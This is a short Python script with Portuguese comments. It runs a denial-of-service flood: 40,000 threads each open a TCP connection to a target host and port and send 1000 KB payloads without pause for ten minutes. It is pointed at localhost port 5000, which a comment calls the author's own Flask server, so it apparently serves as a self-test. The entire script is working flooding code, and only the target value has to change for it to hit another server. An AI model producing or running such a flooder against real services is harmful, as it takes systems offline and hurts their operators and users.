import threading
import socket
import random
import time

# Configuração do alvo do ataque
target_host = "localhost"
target_port = 5000  # porta do meu servidor fflask

num_connections = 40000

# carga útil dos dados a serem enviados
payload = b"X" * 1024 * 1000  # Payload de 1000 KB

# tempo de execução do ataque (em segundos)
attack_duration = 600

start_time = time.time()

def send_data():
    try:
        # criação do socket TCP/IP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # conecta-se ao alvo
        sock.connect((target_host, target_port))
        # envia os dados repetidamente até o tempo de execução acabar
        while time.time() - start_time < attack_duration:
            sock.sendall(payload)
    except Exception as e:
        print(f"Erro ao enviar os dados: {e}")

# Inicia as threads para realizar as conexões


def start_attack():
    print("Ataque iniciado...")
    for _ in range(num_connections):
        t = threading.Thread(target=send_data)
        t.start()


# chama a funcao que inicia o ataque
start_attack()

# aguarda o tempo de execução que demorou o ataque
time.sleep(attack_duration)

print("Ataque concluído.")
